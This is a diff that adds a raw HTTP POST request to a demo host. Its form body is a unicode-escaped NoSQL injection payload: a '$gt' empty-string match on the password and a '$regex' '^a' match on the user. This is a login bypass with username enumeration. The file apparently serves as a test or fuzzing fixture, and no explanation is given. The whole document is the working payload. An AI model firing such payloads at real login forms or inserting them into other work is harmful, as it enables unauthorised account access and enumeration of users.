@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+Connection: close
+
+id={\u0022password\u0022:{\u0022$gt\u0022:\u0022\u0022},\u0022user\u0022:{\u0022$regex\u0022:\u0022^a\u0022}}
